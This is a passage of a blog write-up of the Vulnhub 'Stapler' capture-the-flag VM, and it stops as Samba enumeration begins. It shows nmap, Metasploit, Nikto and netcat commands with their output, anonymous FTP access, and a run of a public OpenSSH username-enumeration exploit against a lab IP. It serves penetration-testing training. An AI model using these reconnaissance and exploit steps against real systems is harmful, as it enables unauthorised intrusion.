
<!DOCTYPE html>
<!--[if IEMobile 7 ]><html class="no-js iem7"><![endif]-->
<!--[if lt IE 9]><html class="no-js lte-ie8"><![endif]-->
<!--[if (gt IE 8)|(gt IEMobile 7)|!(IEMobile)|!(IE)]><!--><html class="no-js" lang="en"><!--<![endif]-->
<head>
  <meta charset="utf-8">
  <title>Got a Stapler? - Core dump overflow</title>
  <meta name="author" content="chousensha">

  
  
  <meta name="description" content="Stapler writeup">
  <meta name="keywords" content="stapler, stapler vulnhub, stapler walkthrough, stapler writeup, vulnhub, pentest lab, hacking lab, ctf">
  

  <!-- http://t.co/dKP3o1e -->
  <meta name="HandheldFriendly" content="True">
  <meta name="MobileOptimized" content="320">
  <meta name="viewport" content="width=device-width, initial-scale=1">

  
  <link rel="canonical" href="http://chousensha.github.io/blog/2018/05/27/got-a-stapler">
  <link href="/favicon.png" rel="icon">
  <link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
  <link href="/atom.xml" rel="alternate" title="Core dump overflow" type="application/atom+xml">
  <script src="/javascripts/modernizr-2.0.js"></script>
  <script src="//ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
  <script>!window.jQuery && document.write(unescape('%3Cscript src="./javascripts/libs/jquery.min.js"%3E%3C/script%3E'))</script>
  <script src="/javascripts/octopress.js" type="text/javascript"></script>
  <!--Fonts from Google"s Web font directory at http://google.com/webfonts -->
<link href="//fonts.googleapis.com/css?family=PT+Serif:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
<link href="//fonts.googleapis.com/css?family=PT+Sans:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">

  
  <script type="text/javascript">
    var _gaq = _gaq || [];
    _gaq.push(['_setAccount', 'UA-51216602-2']);
    _gaq.push(['_trackPageview']);

    (function() {
      var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
      ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
      var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
    })();
  </script>


</head>

<body   >
  <header role="banner"><hgroup>
  <h1><a href="/">Core dump overflow</a></h1>
  
    <h2>Core dump in progress...</h2>
  
</hgroup>

</header>
  <nav role="navigation"><ul class="subscription" data-subscription="rss">
  <li><a href="/atom.xml" rel="subscribe-rss" title="subscribe via RSS">RSS</a></li>
  
</ul>
  
<form action="https://www.google.com/search" method="get">
  <fieldset role="search">
    <input type="hidden" name="q" value="site:chousensha.github.io" />
    <input class="search" type="text" name="q" results="0" placeholder="Search"/>
  </fieldset>
</form>
  
<ul class="main-navigation">
  <li><a href="/">Blog</a></li>
  <li><a href="/where-to-start">Where to start</a></li>
  <li><a href="/book-corner">Book corner</a></li>
  <li><a href="/blog/archives">Archives</a></li>
</ul>

</nav>
  <div id="main">
    <div id="content">
      <div>
<article class="hentry" role="article">
  
  <header>
    
      <h1 class="entry-title">Got a Stapler?</h1>
    
    
      <p class="meta">
        








  


<time datetime="2018-05-27T00:24:11+03:00" pubdate data-updated="true">May 27<span>th</span>, 2018</time>
        
           | <a href="#disqus_thread"
             data-disqus-identifier="http://chousensha.github.io">Comments</a>
        
      </p>
    
  </header>


<div class="entry-content"><p>Today&rsquo;s target is a VM made by g0tmi1k for BsidesLondon 2016. So this should be a fun one! From the description:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>| + There are multiple methods to-do this machine         |
</span><span class='line'>|   + At least two (2) paths to get a limited shell       |
</span><span class='line'>|   + At least three (3) ways to get a root access        |</span></code></pre></td></tr></table></div></figure>




<!-- more -->




<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
<span class='line-number'>72</span>
<span class='line-number'>73</span>
<span class='line-number'>74</span>
<span class='line-number'>75</span>
<span class='line-number'>76</span>
<span class='line-number'>77</span>
<span class='line-number'>78</span>
<span class='line-number'>79</span>
<span class='line-number'>80</span>
<span class='line-number'>81</span>
<span class='line-number'>82</span>
<span class='line-number'>83</span>
<span class='line-number'>84</span>
<span class='line-number'>85</span>
<span class='line-number'>86</span>
<span class='line-number'>87</span>
<span class='line-number'>88</span>
<span class='line-number'>89</span>
<span class='line-number'>90</span>
<span class='line-number'>91</span>
<span class='line-number'>92</span>
<span class='line-number'>93</span>
<span class='line-number'>94</span>
<span class='line-number'>95</span>
<span class='line-number'>96</span>
<span class='line-number'>97</span>
<span class='line-number'>98</span>
<span class='line-number'>99</span>
<span class='line-number'>100</span>
<span class='line-number'>101</span>
<span class='line-number'>102</span>
<span class='line-number'>103</span>
<span class='line-number'>104</span>
<span class='line-number'>105</span>
<span class='line-number'>106</span>
<span class='line-number'>107</span>
<span class='line-number'>108</span>
<span class='line-number'>109</span>
<span class='line-number'>110</span>
<span class='line-number'>111</span>
<span class='line-number'>112</span>
<span class='line-number'>113</span>
<span class='line-number'>114</span>
<span class='line-number'>115</span>
<span class='line-number'>116</span>
<span class='line-number'>117</span>
<span class='line-number'>118</span>
<span class='line-number'>119</span>
<span class='line-number'>120</span>
<span class='line-number'>121</span>
<span class='line-number'>122</span>
<span class='line-number'>123</span>
<span class='line-number'>124</span>
<span class='line-number'>125</span>
<span class='line-number'>126</span>
<span class='line-number'>127</span>
<span class='line-number'>128</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>PORT      STATE  SERVICE     VERSION
</span><span class='line'>20/tcp    closed ftp-data
</span><span class='line'>21/tcp    open   ftp         vsftpd 2.0.8 or later
</span><span class='line'>| ftp-anon: Anonymous FTP login allowed (FTP code 230)
</span><span class='line'>|_Can't get directory listing: PASV failed: 550 Permission denied.
</span><span class='line'>| ftp-syst: 
</span><span class='line'>|   STAT: 
</span><span class='line'>| FTP server status:
</span><span class='line'>|      Connected to 192.168.217.132
</span><span class='line'>|      Logged in as ftp
</span><span class='line'>|      TYPE: ASCII
</span><span class='line'>|      No session bandwidth limit
</span><span class='line'>|      Session timeout in seconds is 300
</span><span class='line'>|      Control connection is plain text
</span><span class='line'>|      Data connections will be plain text
</span><span class='line'>|      At session startup, client count was 2
</span><span class='line'>|      vsFTPd 3.0.3 - secure, fast, stable
</span><span class='line'>|_End of status
</span><span class='line'>22/tcp    open   ssh         OpenSSH 7.2p2 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
</span><span class='line'>| ssh-hostkey: 
</span><span class='line'>|   2048 81:21:ce:a1:1a:05:b1:69:4f:4d:ed:80:28:e8:99:05 (RSA)
</span><span class='line'>|   256 5b:a5:bb:67:91:1a:51:c2:d3:21:da:c0:ca:f0:db:9e (ECDSA)
</span><span class='line'>|_  256 6d:01:b7:73:ac:b0:93:6f:fa:b9:89:e6:ae:3c:ab:d3 (ED25519)
</span><span class='line'>53/tcp    open   domain      dnsmasq 2.75
</span><span class='line'>| dns-nsid: 
</span><span class='line'>|_  bind.version: dnsmasq-2.75
</span><span class='line'>80/tcp    open   http        PHP cli server 5.5 or later
</span><span class='line'>|_http-title: 404 Not Found
</span><span class='line'>123/tcp   closed ntp
</span><span class='line'>137/tcp   closed netbios-ns
</span><span class='line'>138/tcp   closed netbios-dgm
</span><span class='line'>139/tcp   open   netbios-ssn Samba smbd 4.3.9-Ubuntu (workgroup: WORKGROUP)
</span><span class='line'>666/tcp   open   doom?
</span><span class='line'>| fingerprint-strings: 
</span><span class='line'>|   NULL: 
</span><span class='line'>|     message2.jpgUT 
</span><span class='line'>|     QWux
</span><span class='line'>|     "DL[E
</span><span class='line'>|     #;3[
</span><span class='line'>|     \xf6
</span><span class='line'>|     u([r
</span><span class='line'>|     qYQq
</span><span class='line'>|     Y_?n2
</span><span class='line'>|     3&M~{
</span><span class='line'>|     9-a)T
</span><span class='line'>|     L}AJ
</span><span class='line'>|_    .npy.9
</span><span class='line'>3306/tcp  open   mysql       MySQL 5.7.12-0ubuntu1
</span><span class='line'>| mysql-info: 
</span><span class='line'>|   Protocol: 10
</span><span class='line'>|   Version: 5.7.12-0ubuntu1
</span><span class='line'>|   Thread ID: 7
</span><span class='line'>|   Capabilities flags: 63487
</span><span class='line'>|   Some Capabilities: SupportsCompression, LongPassword, LongColumnFlag, ODBCClient, Support41Auth, InteractiveClient, Speaks41ProtocolOld, SupportsTransactions, FoundRows, IgnoreSigpipes, DontAllowDatabaseTableColumn, Speaks41ProtocolNew, SupportsLoadDataLocal, IgnoreSpaceBeforeParenthesis, ConnectWithDatabase, SupportsMultipleResults, SupportsAuthPlugins, SupportsMultipleStatments
</span><span class='line'>|   Status: Autocommit
</span><span class='line'>|   Salt: *o\x069%}F\x0B\x1B+'\x14l\x19PET8\x15J
</span><span class='line'>|_  Auth Plugin Name: 88
</span><span class='line'>12380/tcp open   http        Apache httpd 2.4.18 ((Ubuntu))
</span><span class='line'>|_http-server-header: Apache/2.4.18 (Ubuntu)
</span><span class='line'>|_http-title: Tim, we need to-do better next year for Initech
</span><span class='line'>1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
</span><span class='line'>SF-Port666-TCP:V=7.70%I=7%D=5/27%Time=5B0A6560%P=x86_64-pc-linux-gnu%r(NUL
</span><span class='line'>SF:L,2D58,"PK\x03\x04\x14\0\x02\0\x08\0d\x80\xc3Hp\xdf\x15\x81\xaa,\0\0\x1
</span><span class='line'>SF:52\0\0\x0c\0\x1c\0message2\.jpgUT\t\0\x03\+\x9cQWJ\x9cQWux\x0b\0\x01\x0
</span><span class='line'>SF:4\xf5\x01\0\0\x04\x14\0\0\0\xadz\x0bT\x13\xe7\xbe\xefP\x94\x88\x88A@\xa
</span><span class='line'>SF:2\x20\x19\xabUT\xc4T\x11\xa9\x102&gt;\x8a\xd4RDK\x15\x85Jj\xa9\"DL\[E\xa2\
</span><span class='line'>SF:x0c\x19\x140&lt;\xc4\xb4\xb5\xca\xaen\x89\x8a\x8aV\x11\x91W\xc5H\x20\x0f\x
</span><span class='line'>SF:b2\xf7\xb6\x88\n\x82@%\x99d\xb7\xc8#;3\[\r_\xcddr\x87\xbd\xcf9\xf7\xaeu
</span><span class='line'>SF:\xeeY\xeb\xdc\xb3oX\xacY\xf92\xf3e\xfe\xdf\xff\xff\xff=2\x9f\xf3\x99\xd
</span><span class='line'>SF:3\x08y}\xb8a\xe3\x06\xc8\xc5\x05\x82&gt;`\xfe\x20\xa7\x05:\xb4y\xaf\xf8\xa
</span><span class='line'>SF:0\xf8\xc0\^\xf1\x97sC\x97\xbd\x0b\xbd\xb7nc\xdc\xa4I\xd0\xc4\+j\xce\[\x
</span><span class='line'>SF:87\xa0\xe5\x1b\xf7\xcc=,\xce\x9a\xbb\xeb\xeb\xdds\xbf\xde\xbd\xeb\x8b\x
</span><span class='line'>SF:f4\xfdis\x0f\xeeM\?\xb0\xf4\x1f\xa3\xcceY\xfb\xbe\x98\x9b\xb6\xfb\xe0\x
</span><span class='line'>SF:dc\]sS\xc5bQ\xfa\xee\xb7\xe7\xbc\x05AoA\x93\xfe9\xd3\x82\x7f\xcc\xe4\xd
</span><span class='line'>SF:5\x1dx\xa2O\x0e\xdd\x994\x9c\xe7\xfe\x871\xb0N\xea\x1c\x80\xd63w\xf1\xa
</span><span class='line'>SF:f\xbd&&q\xf9\x97'i\x85fL\x81\xe2\\\xf6\xb9\xba\xcc\x80\xde\x9a\xe1\xe2:
</span><span class='line'>SF:\xc3\xc5\xa9\x85`\x08r\x99\xfc\xcf\x13\xa0\x7f{\xb9\xbc\xe5:i\xb2\x1bk\
</span><span class='line'>SF:x8a\xfbT\x0f\xe6\x84\x06/\xe8-\x17W\xd7\xb7&\xb9N\x9e&lt;\xb1\\\.\xb9\xcc\
</span><span class='line'>SF:xe7\xd0\xa4\x19\x93\xbd\xdf\^\xbe\xd6\xcdg\xcb\.\xd6\xbc\xaf\|W\x1c\xfd
</span><span class='line'>SF:\xf6\xe2\x94\xf9\xebj\xdbf~\xfc\x98x'\xf4\xf3\xaf\x8f\xb9O\xf5\xe3\xcc\
</span><span class='line'>SF:x9a\xed\xbf`a\xd0\xa2\xc5KV\x86\xad\n\x7fou\xc4\xfa\xf7\xa37\xc4\|\xb0\
</span><span class='line'>SF:xf1\xc3\x84O\xb6nK\xdc\xbe#\)\xf5\x8b\xdd{\xd2\xf6\xa6g\x1c8\x98u\(\[r\
</span><span class='line'>SF:xf8H~A\xe1qYQq\xc9w\xa7\xbe\?}\xa6\xfc\x0f\?\x9c\xbdTy\xf9\xca\xd5\xaak
</span><span class='line'>SF:\xd7\x7f\xbcSW\xdf\xd0\xd8\xf4\xd3\xddf\xb5F\xabk\xd7\xff\xe9\xcf\x7fy\
</span><span class='line'>SF:xd2\xd5\xfd\xb4\xa7\xf7Y_\?n2\xff\xf5\xd7\xdf\x86\^\x0c\x8f\x90\x7f\x7f
</span><span class='line'>SF:\xf9\xea\xb5m\x1c\xfc\xfef\"\.\x17\xc8\xf5\?B\xff\xbf\xc6\xc5,\x82\xcb\
</span><span class='line'>SF:[\x93&\xb9NbM\xc4\xe5\xf2V\xf6\xc4\t3&M~{\xb9\x9b\xf7\xda-\xac\]_\xf9\x
</span><span class='line'>SF:cc\[qt\x8a\xef\xbao/\xd6\xb6\xb9\xcf\x0f\xfd\x98\x98\xf9\xf9\xd7\x8f\xa
</span><span class='line'>SF:7\xfa\xbd\xb3\x12_@N\x84\xf6\x8f\xc8\xfe{\x81\x1d\xfb\x1fE\xf6\x1f\x81\
</span><span class='line'>SF:xfd\xef\xb8\xfa\xa1i\xae\.L\xf2\\g@\x08D\xbb\xbfp\xb5\xd4\xf4Ym\x0bI\x9
</span><span class='line'>SF:6\x1e\xcb\x879-a\)T\x02\xc8\$\x14k\x08\xae\xfcZ\x90\xe6E\xcb&lt;C\xcap\x8f
</span><span class='line'>SF:\xd0\x8f\x9fu\x01\x8dvT\xf0'\x9b\xe4ST%\x9f5\x95\xab\rSWb\xecN\xfb&\xf4
</span><span class='line'>SF:\xed\xe3v\x13O\xb73A#\xf0,\xd5\xc2\^\xe8\xfc\xc0\xa7\xaf\xab4\xcfC\xcd\
</span><span class='line'>SF:x88\x8e}\xac\x15\xf6~\xc4R\x8e`wT\x96\xa8KT\x1cam\xdb\x99f\xfb\n\xbc\xb
</span><span class='line'>SF:cL}AJ\xe5H\x912\x88\(O\0k\xc9\xa9\x1a\x93\xb8\x84\x8fdN\xbf\x17\xf5\xf0
</span><span class='line'>SF:\.npy\.9\x04\xcf\x14\x1d\x89Rr9\xe4\xd2\xae\x91#\xfbOg\xed\xf6\x15\x04\
</span><span class='line'>SF:xf6~\xf1\]V\xdcBGu\xeb\xaa=\x8e\xef\xa4HU\x1e\x8f\x9f\x9bI\xf4\xb6GTQ\x
</span><span class='line'>SF:f3\xe9\xe5\x8e\x0b\x14L\xb2\xda\x92\x12\xf3\x95\xa2\x1c\xb3\x13\*P\x11\
</span><span class='line'>SF:?\xfb\xf3\xda\xcaDfv\x89`\xa9\xe4k\xc4S\x0e\xd6P0");
</span><span class='line'>MAC Address: 00:0C:29:2B:76:7B (VMware)
</span><span class='line'>Device type: general purpose
</span><span class='line'>Running: Linux 3.X|4.X
</span><span class='line'>OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
</span><span class='line'>OS details: Linux 3.2 - 4.9
</span><span class='line'>Network Distance: 1 hop
</span><span class='line'>Service Info: Host: RED; OS: Linux; CPE: cpe:/o:linux:linux_kernel
</span><span class='line'>
</span><span class='line'>Host script results:
</span><span class='line'>|_clock-skew: mean: 2h37m22s, deviation: 34m37s, median: 2h57m21s
</span><span class='line'>|_nbstat: NetBIOS name: RED, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; (unknown)
</span><span class='line'>| smb-os-discovery: 
</span><span class='line'>|   OS: Windows 6.1 (Samba 4.3.9-Ubuntu)
</span><span class='line'>|   Computer name: red
</span><span class='line'>|   NetBIOS computer name: RED\x00
</span><span class='line'>|   Domain name: \x00
</span><span class='line'>|   FQDN: red
</span><span class='line'>|_  System time: 2018-05-27T11:57:06+01:00
</span><span class='line'>| smb-security-mode: 
</span><span class='line'>|   account_used: guest
</span><span class='line'>|   authentication_level: user
</span><span class='line'>|   challenge_response: supported
</span><span class='line'>|_  message_signing: disabled (dangerous, but default)
</span><span class='line'>| smb2-security-mode: 
</span><span class='line'>|   2.02: 
</span><span class='line'>|_    Message signing enabled but not required
</span><span class='line'>| smb2-time: 
</span><span class='line'>|   date: 2018-05-27 06:57:06
</span><span class='line'>|_  start_date: N/A
</span></code></pre></td></tr></table></div></figure>


<p>Many services, so multiple entry points..hopefully. I decided to check each of them.</p>

<h2>FTP server</h2>

<p>In the port scan results we saw how the FTP server allows anonymous logins. I wanted to find out more about it and used the Metasploit auxiliary FTP scanner:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>msf auxiliary(scanner/ftp/ftp_version) &gt; run
</span><span class='line'>
</span><span class='line'>[+] 192.168.217.141:21    - FTP Banner: '220-\x0d\x0a220-|-----------------------------------------------------------------------------------------|\x0d\x0a220-| Harry, make sure to update the banner when you get a chance to show who has access here |\x0d\x0a220-|-----------------------------------------------------------------------------------------|\x0d\x0a220-\x0d\x0a220 \x0d\x0a'
</span><span class='line'>[*] Scanned 1 of 1 hosts (100% complete)
</span><span class='line'>[*] Auxiliary module execution completed</span></code></pre></td></tr></table></div></figure>


<p>Now we know a possible username. Next I logged in anonymously to the server and found a note, which I downloaded:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>ftp&gt; dir
</span><span class='line'>200 PORT command successful. Consider using PASV.
</span><span class='line'>150 Here comes the directory listing.
</span><span class='line'>-rw-r--r--    1 0        0             107 Jun 03  2016 note
</span><span class='line'>226 Directory send OK.
</span><span class='line'>ftp&gt; get note
</span><span class='line'>local: note remote: note
</span><span class='line'>200 PORT command successful. Consider using PASV.
</span><span class='line'>150 Opening BINARY mode data connection for note (107 bytes).
</span><span class='line'>226 Transfer complete.
</span><span class='line'>107 bytes received in 0.05 secs (1.9866 kB/s)</span></code></pre></td></tr></table></div></figure>


<p>The note reveals more names that might come in handy later:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>cat note
</span><span class='line'>Elly, make sure you update the payload information. Leave it in your FTP account once your are done, John.</span></code></pre></td></tr></table></div></figure>


<p>Before moving on, I made a list of the usernames that were found so far + root:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:~# cat users
</span><span class='line'>harry
</span><span class='line'>elly
</span><span class='line'>john
</span><span class='line'>root</span></code></pre></td></tr></table></div></figure>


<h2>OpenSSH 7.2p2</h2>

<p>With the usernames I found, I tried the <a href="https://www.exploit-db.com/exploits/40136/">OpenSSH 7.2p2 &ndash; Username Enumeration exploit</a>, but with no success:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>python 40136.py -U users 192.168.217.141
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>User name enumeration against SSH daemons affected by CVE-2016-6210
</span><span class='line'>Created and coded by 0_o (nu11.nu11 [at] yahoo.com), PoC by Eddie Harari
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>[*] Testing SSHD at: 192.168.217.141:22, Banner: SSH-2.0-OpenSSH_7.2p2 Ubuntu-4
</span><span class='line'>[*] Getting baseline timing for authenticating non-existing users............
</span><span class='line'>[*] Baseline mean for host 192.168.217.141 is 0.0489913 seconds.
</span><span class='line'>[*] Baseline variation for host 192.168.217.141 is 0.0210717273238 seconds.
</span><span class='line'>[*] Defining timing of x &lt; 0.112206481972 as non-existing user.
</span><span class='line'>[*] Testing your users...
</span><span class='line'>[-] harry - timing: 0.075312
</span><span class='line'>[-] elly - timing: 0.06393
</span><span class='line'>[-] john - timing: 0.050554
</span><span class='line'>[-] root - timing: 0.084294</span></code></pre></td></tr></table></div></figure>


<p>I decided to move on and come back if I get more usernames or fail to get in with other methods.</p>

<h2>dnsmasq</h2>

<p>After some research, I found that dnsmasq 2.75 is prone to multiple DoS vulnerabilities:</p>

<p><a href="https://www.cvedetails.com/cve/CVE-2015-8899/">https://www.cvedetails.com/cve/CVE-2015-8899/</a></p>

<p><a href="https://www.exploit-db.com/exploits/42942/">https://www.exploit-db.com/exploits/42942/</a></p>

<p>We don&rsquo;t want to crash the machine, but we could if we wanted to :)</p>

<h2>Web server on port 80</h2>

<p>The webpage seems empty, with only a Not Found message that states &ldquo;The requested resource / was not found on this server.&rdquo;</p>

<p>I ran Nikto with no big discoveries:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>nikto -h http://192.168.217.141/
</span><span class='line'>- Nikto v2.1.6
</span><span class='line'>---------------------------------------------------------------------------
</span><span class='line'>+ Target IP:          192.168.217.141
</span><span class='line'>+ Target Hostname:    192.168.217.141
</span><span class='line'>+ Target Port:        80
</span><span class='line'>+ Start Time:         2018-06-01 04:44:48 (GMT-4)
</span><span class='line'>---------------------------------------------------------------------------
</span><span class='line'>+ Server: No banner retrieved
</span><span class='line'>+ The anti-clickjacking X-Frame-Options header is not present.
</span><span class='line'>+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
</span><span class='line'>+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
</span><span class='line'>+ No CGI Directories found (use '-C all' to force check all possible dirs)
</span><span class='line'>+ OSVDB-3093: /.bashrc: User home dir was found with a shell rc file. This may reveal file and path information.
</span><span class='line'>+ OSVDB-3093: /.profile: User home dir with a shell profile was found. May reveal directory information and system configuration.
</span><span class='line'>+ ERROR: Error limit (20) reached for host, giving up. Last error: error reading HTTP response
</span><span class='line'>+ Scan terminated:  20 error(s) and 5 item(s) reported on remote host
</span><span class='line'>+ End Time:           2018-06-01 04:45:10 (GMT-4) (22 seconds)
</span><span class='line'>---------------------------------------------------------------------------
</span><span class='line'>+ 1 host(s) tested</span></code></pre></td></tr></table></div></figure>


<p>Downloaded the .bashrc and .profile files, but there was nothing useful in there.</p>

<h2>Doom</h2>

<p>Here I couldn&rsquo;t find much, the data returned when connecting to it is gibberish. I&rsquo;ve read online about how this could be used for the original Doom game. But there was something that caught my eye when Nmap attempted to fingerprint this:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>message2.jpgUT</span></code></pre></td></tr></table></div></figure>


<p>Maybe I can redirect this to a file and get an image.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>nc -vn 192.168.217.141 666 &gt; something
</span><span class='line'>(UNKNOWN) [192.168.217.141] 666 (?) open
</span><span class='line'>root@kali:~# file something 
</span><span class='line'>something: Zip archive data, at least v2.0 to extract</span></code></pre></td></tr></table></div></figure>


<p>Nice, an archive! Inside there was the image from earlier:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>unzip something
</span><span class='line'>Archive:  something
</span><span class='line'>  inflating: message2.jpg      </span></code></pre></td></tr></table></div></figure>


<p><img class="center" src="/images/pentest/stapler/message2.jpg" title="message" alt="message"></p>

<p>This is it? Maybe there&rsquo;s something more..I ran strings on it to get another message:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>1If you are reading this, you should get a cookie!</span></code></pre></td></tr></table></div></figure>


<p>At least it&rsquo;s something..</p>

<h2>MySQL</h2>

<p>Nothing significant here, but something must be using this database.</p>

<h1>Shell #1 &ndash; Samba</h1>

<p>I used enum4linux for Samba enumeration, but only showing what I found most interesting below:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
